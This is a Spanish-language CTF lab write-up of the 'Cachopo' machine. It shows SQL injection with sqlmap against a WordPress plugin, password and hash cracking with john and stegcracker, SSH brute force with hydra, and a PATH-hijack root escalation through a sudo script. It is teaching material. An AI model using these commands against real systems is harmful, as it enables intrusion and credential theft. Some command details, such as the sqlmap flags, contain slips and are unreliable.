<h1 align="center"><img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/b69288c3-8b6b-4fcb-87f3-067a0a9dbc10" /></h1> 
<h1 align="center">:rotating_light::bulb:TALLE EN CLASE CACHOPO – RESOLUCIÓN DE MÁQUINA:bulb::rotating_light:</h1> 

# :eight_spoked_asterisk: **Rubén Contreras Caballero** :anchor:
# :eight_spoked_asterisk: **Johan Martínez Rojas** :anchor:
# :eight_spoked_asterisk: **Mauricio Gómez Rodríguez** :tent:


## :one: Descripción General del Reto

El presente documento describe el proceso de resolución de la máquina CTF "CACHOPO", un entorno vulnerable diseñado para simular escenarios reales de ciberseguridad ofensiva en sistemas Linux. La máquina contiene múltiples vectores de ataque, entre ellos una instancia de WordPress vulnerable, archivos con información oculta mediante esteganografía y configuraciones débiles de privilegios en el sistema operativo.
El objetivo del ejercicio es comprometer completamente la máquina, obteniendo acceso inicial al sistema, escalando privilegios hasta nivel root y finalmente capturando la flag ubicada en el directorio /root. Para ello, se emplean herramientas como nmap, wpscan, sqlmap, stegcracker, hydra y john.

## :two: Enumeración y Detección de Servicios

La fase de enumeración permite identificar los servicios y puertos abiertos en la máquina objetivo. Para ello, se utilizó la herramienta nmap, ejecutando un escaneo completo sobre todos los puertos TCP.

| Comando ejecutado:            | `nmap -p- -sS -sC -sV -T4 -Pn 10.0.2.30`                                 |
|-------------------------------|---------------------------------------------------------------------------|
| Parámetros explicados:        |  **-p-**: escanea los 65,535 puertos                                     |
|                               |  **-sS**: escaneo SYN (rápido y sigiloso)                                |
|                               |  **-sC**: ejecuta scripts NSE por defecto                                |
|                               |  **-sV**: detecta versiones de servicios                                 |
|                               |  **-T4**: velocidad agresiva                                             |
|                               |  **-Pn**: omite detección de host                                        |

Se detecta un servidor web en el puerto 80 y un servicio SSH en el puerto 22. El análisis se centra inicialmente en el servicio web, por ser un punto frecuente de entrada en pruebas de penetración

<h1 align="center"><img width="889" height="197" alt="image" src="https://github.com/user-attachments/assets/063eba77-35cb-4529-9a7a-c95b1b67bf65" /></h1> 

La fase inicial se enfocó en descubrir los servicios expuestos en la máquina objetivo 10.0.2.30. Para ello, se utilizó nmap, realizando un escaneo intensivo de todos los puertos TCP y aplicando scripts de detección automática.

:eight_spoked_asterisk: **Resultado destacado:**

- Nmap scan report for 10.0.2.30
- Host is up (0.0020s latency).
- Not shown: 65533 closed ports

| Puerto  | Estado | Servicio | Versión                        |
|---------|--------|----------|--------------------------------|
| 22/tcp  | open   | ssh      | OpenSSH 8.9p1 Debian           |
| 80/tcp  | open   | http     | Apache httpd 2.4.54 ((Debian)) |

**Puerto 22/tcp:** Servicio SSH activo (OpenSSH 8.9p1)

**Puerto 80/tcp:** Servidor HTTP Apache activo. Se observará más a fondo en la siguiente fase.

Este escaneo inicial permite enfocar el análisis en el servicio web, donde se encuentra una posible vía de explotación


## :three: Análisis del Servicio Web (WordPress)

- Al acceder desde un navegador a http://10.0.2.30, el servidor redirige a un nombre de dominio interno: http://cachopo.local. Para resolver esta dirección correctamente, fue necesario editar el archivo /etc/hosts en la máquina atacante:

- echo "10.0.2.30 cachopo.local" >> /etc/hosts

Una vez hecho esto, se accede al sitio web, el cual está construido sobre WordPress. Para analizar su configuración y detectar vulnerabilidades, se utiliza la herramienta wpscan.

| Comando ejecutado:                       | `wpscan --url http://cachopo.local --enumerate u,vp,vt`     |
|------------------------------------------|--------------------------------------------------------------|
| Resultados destacados:                   | Usuario identificado: admin                                  |
|                                          | Plugin vulnerable detectado: simple-events                   |
|                                          | Tipo de vulnerabilidad: **Inyección SQL (SQLi)**             |

El plugin simple-events presenta una vulnerabilidad que permite manipular las consultas SQL a través de parámetros GET sin la debida sanitización, lo cual representa una grave brecha de seguridad. Esto indica una vía clara de explotación para acceder a información sensible de la base de datos, como usuarios y contraseñas, lo cual será abordado en la siguiente fase.

<h1 align="center"><img width="881" height="228" alt="image" src="https://github.com/user-attachments/assets/bdda20ed-314e-4cc6-a5d6-4a5ce403bf98" /></h1> 


## :four: Explotación vía Inyección SQL

Tras identificar el plugin simple-events como vulnerable a inyección SQL, se procede a la explotación del mismo para obtener información sensible directamente desde la base de datos del sistema WordPress.
La URL vulnerable corresponde al parámetro id en la ruta de visualización de eventos:
```bash
http://cachopo.local/wp-content/plugins/simple-events/view_event.php?id=1
```
Se usa la herramienta sqlmap para automatizar la explotación.

| Comando ejecutado                                                                        | sqlmap -u "http://cachopo.local/wp-content/plugins/simple-events/view_event.php?id=1" --dump-batch                          |
|------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------|
| Resultados obtenidos                                                                     |                                                                                                                             |
| Nombre de la base de datos:                                                              | wordpress                                                                                                                   |
| Tabla:                                                                                   | wp_users                                                                                                                    |
| Columnas:                                                                               | user_login, user_pass                                                                                                       |
| Usuario extraído:                                                                       | admin                                                                                                                       |
| Contraseña hasheada (MD5 o WordPress hash):                                              | $P$B0cYv7GnEOWcKsk34nShI7Smf/Fr.z1                                                                                          |

La contraseña extraída se crackea posteriormente usando john con la lista rockyou.txt.

| Crackeo del hash con John the Ripper             | `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt` |
|--------------------------------------------------|-------------------------------------------------------------|
| Resultado                                        | Usuario: admin<br>Contraseña: palomitas123                  |

<h1 align="center"><img width="980" height="296" alt="image" src="https://github.com/user-attachments/assets/3f515041-ce7c-4b1b-8fe4-e768583abe4a" /></h1> 

## :five: Esteganografía – Extracción de Información Oculta

Durante el análisis del sitio web, se detectó una imagen llamada header.jpg en la página principal. Debido a su tamaño inusualmente elevado y su ubicación visible pero sin función clara, se sospecha que podría contener información oculta mediante técnicas de esteganografía.

Se utilizó la herramienta stegcracker, junto con el diccionario rockyou.txt, para intentar descubrir una contraseña que permitiera extraer el contenido oculto.

| Comando ejecutado                              | stegcracker header.jpg /usr/share/wordlists/rockyou.txt                |
|------------------------------------------------|-----------------------------------------------------------------------|
| Resultado                                      | [+] Successfully cracked file with password: **gatoazul**             |

<h1 align="center"><img width="884" height="116" alt="image" src="https://github.com/user-attachments/assets/992da70f-eaa4-4e43-905d-2030d5881ea5" /></h1> 

Se extrae un archivo llamado staff.docx, protegido con contraseña. A continuación, se procede a crackear el archivo usando office2john.py y john:

| office2john.py staff.docx           | hash.txt john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt        |
|-------------------------------------|---------------------------------------------------------------------------|
| Contraseña del documento            | luna2023                                                                  |

Al abrir el archivo, se encuentran tres posibles nombres de usuario del sistema: ana, jose, lucia. 

Estos nombres serán utilizados para realizar ataques de fuerza bruta contra el servicio SSH.

## :six: Ataque de Fuerza Bruta sobre el Servicio SSH

Con los nombres de usuario obtenidos del archivo staff.docx (ana, jose, lucia), se procede a realizar un ataque de fuerza bruta contra el servicio SSH expuesto en el puerto 22. Para ello, se crea un archivo de texto llamado users.txt que contiene los posibles usuarios.

Se ejecuta la herramienta hydra usando el diccionario rockyou.txt como lista de contraseñas.

| Comando ejecutado | hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.30 -t 4 |
|-------------------|----------------------------------------------------------------------------|
| Resultado         | [22][ssh] host: 10.0.2.30  login: lucia  password: luna2023                |

Se confirma que el usuario lucia tiene acceso SSH con la contraseña previamente obtenida al crackear el archivo oculto. Esto permite el ingreso inicial al sistema.

| Conexión exitosa | ssh lucia@10.0.2.30 |
|------------------|---------------------|

## :seven: Escalamiento de Privilegios a Root

Una vez establecida la conexión SSH con el usuario lucia, se examinan los permisos de sudo disponibles para determinar si es posible escalar privilegios.

| Conexión establecida                 | ssh lucia@10.0.2.30                                                    |
|--------------------------------------|------------------------------------------------------------------------|
| Resultado                            | User lucia may run the following commands on cachopo:<br>(ALL) NOPASSWD: /usr/local/bin/logsaver |

El binario logsaver puede ser ejecutado como root sin necesidad de contraseña. Se analiza su contenido para identificar posibles vectores de escalamiento.

El script ejecuta el comando cat sin especificar la ruta absoluta, lo que permite realizar un ataque de manipulación del PATH.

| Procedimiento para escalar privilegios: | echo "/bin/bash" > cat <br> chmod +x cat <br> export PATH=.:$PATH <br> sudo /usr/local/bin/logsaver |
|-----------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|

Al ejecutar logsaver, el sistema toma el cat falso en el directorio actual, que abre una shell como usuario root.

<h1 align="center"><img width="938" height="314" alt="image" src="https://github.com/user-attachments/assets/7ce4d371-5c42-40a3-9e8e-21d97b092320" /></h1> 

## :eight: Captura de la Flag

Con privilegios de superusuario (root), se accede al directorio /root, donde habitualmente se encuentra la bandera final de las máquinas CTF.

| Comando ejecutado          | cat /root/root.txt                              |
|---------------------------|-------------------------------------------------|
| Resultado                 | THL{cachopo-root-accessed-successfully}         |

<h1 align="center"><img width="930" height="59" alt="image" src="https://github.com/user-attachments/assets/4c18ed73-ea04-46b7-b76f-06dfdf711350" /></h1>


## :nine:  Conclusiones

La máquina CTF "CACHOPO" permitió aplicar múltiples técnicas ofensivas de ciberseguridad, simulando un entorno realista con vulnerabilidades comunes. A lo largo del ejercicio se abordaron las siguientes etapas:

•	Detección de servicios mediante escaneo de puertos

•	Análisis de un sitio WordPress vulnerable

•	Explotación de una inyección SQL

•	Extracción de archivos ocultos mediante esteganografía

•	Ataque de fuerza bruta contra SSH

•	Escalamiento de privilegios mediante binario mal configurado

•	Obtención de la flag como root

Este ejercicio demuestra la importancia de mantener buenas prácticas de seguridad como:

•	Evitar contraseñas débiles

•	Auditar plugins en CMS
•	Utilizar rutas absolutas en scripts privilegiados

•	Aplicar el principio de privilegio mínimo

## :blue_book: Referencias Consultadas :ledger:

- American Psychological Association. (2020). Publication manual of the American Psychological Association (7.a ed.). American Psychological Association.

- Nmap. (s.f.). Nmap: the network mapper. https://nmap.org/

- WPScan. (s.f.). WordPress security scanner. https://wpscan.com/

- sqlmap. (s.f.). Automated SQL injection and database takeover tool. https://sqlmap.org/

- Stegcracker. (s.f.). Stegcracker: A fast steganography brute-force tool written in Python. https://github.com/Paradoxis/Stegcracker

- THC Hydra. (s.f.). Hydra: very fast network logon cracker. https://github.com/vanhauser-thc/thc-hydra

- John the Ripper. (s.f.). John the Ripper password cracker. https://www.openwall.com/john/

- Rockyou.txt. (2009). SecLists/Passwords/probable-v2-top12000.txt. https://github.com/danielmiessler/SecLists

- pache Software Foundation. (s.f.). Apache HTTP Server Version 2.4 Documentation. https://httpd.apache.org/docs/2.4/

- OpenSSH. (s.f.). OpenSSH. https://www.openssh.com/



